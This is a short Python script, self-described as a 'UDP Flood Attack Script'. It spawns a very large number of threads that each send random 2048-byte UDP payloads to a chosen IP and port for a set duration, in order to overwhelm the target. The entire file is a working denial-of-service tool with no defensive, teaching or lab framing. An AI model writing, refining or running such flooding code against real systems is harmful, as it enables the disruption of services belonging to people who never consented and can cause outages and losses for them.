#!/usr/bin/python3

import argparse
import socket
import threading
import random
import time

class DDoS:
    def __init__(self, ip, port, duration):
        self.target = ip
        self.port = port
        self.duration = duration
        self.stop_event = threading.Event()

    def attack(self):
        print(f"[*] Starting attack on {self.target}:{self.port} for {self.duration} seconds...")
        end_time = time.time() + self.duration
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(2048)  # Adjust payload size as needed

            while time.time() < end_time and not self.stop_event.is_set():
                s.sendto(payload, (self.target, self.port))
                time.sleep(0.01)  # Adjust delay as needed
        except socket.error:
            print(f"[*] Server is down! Exiting...")
        except Exception as e:
            print(f"[*] Error: {str(e)}")
        finally:
            s.close()
            print("Attack finished")

    def stop(self):
        self.stop_event.set()

def parse_args():
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
    parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of the attack in seconds")
    parser.add_argument("--threads", dest="threads", type=int, default=999999999, help="Number of threads")
    return parser.parse_args()

def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    duration = args.duration
    threads = args.threads

    ddos_threads = []
    ddos_instances = []

    for _ in range(threads):
        ddos = DDoS(ip, port, duration)
        ddos_instances.append(ddos)
        ddos_thread = threading.Thread(target=ddos.attack)
        ddos_threads.append(ddos_thread)
        ddos_thread.start()

    for thread in ddos_threads:
        thread.join()

    for ddos in ddos_instances:
        ddos.stop()

if __name__ == "__main__":
    main()
